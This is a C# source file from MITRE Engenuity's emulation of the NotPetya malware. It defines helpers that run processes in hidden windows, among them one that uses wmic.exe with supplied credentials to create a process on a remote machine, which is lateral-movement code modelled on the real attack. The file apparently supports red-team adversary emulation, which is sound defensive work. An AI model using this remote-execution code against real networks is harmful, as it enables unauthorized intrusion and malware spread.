/*=============================================================================================
*
*    Description:  This program emulates NotPetya.
*   
*        Version:  1.0
*        Created:  September 1st, 2021
*
*      Author(s):  Jesse Burgoon
*   Organization:  MITRE Engenuity
*
*  References(s): https://attack.mitre.org/software/S0368/
*
*=============================================================================================
*/
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpNP
{
    class ProcExec
    {
        public static void SharpWmiRemoteExec(string server, string user, string pwd, string proc)
        {
            Process wmic = new Process();
            wmic.StartInfo.FileName = @"C:\Windows\system32\wbem\wmic.exe";
            wmic.StartInfo.Arguments = "/node:\"" + server + "\" /user:\"" + user + "\" /password:\"" + pwd + "\" process call create " + proc;
            wmic.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            wmic.Start();
        }

        public static void SharpProcExec(string proc, string args)
        {
            Process wmic = new Process();
            wmic.StartInfo.FileName = proc;
            wmic.StartInfo.Arguments = args;
            wmic.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            wmic.Start();
        }
    }
}
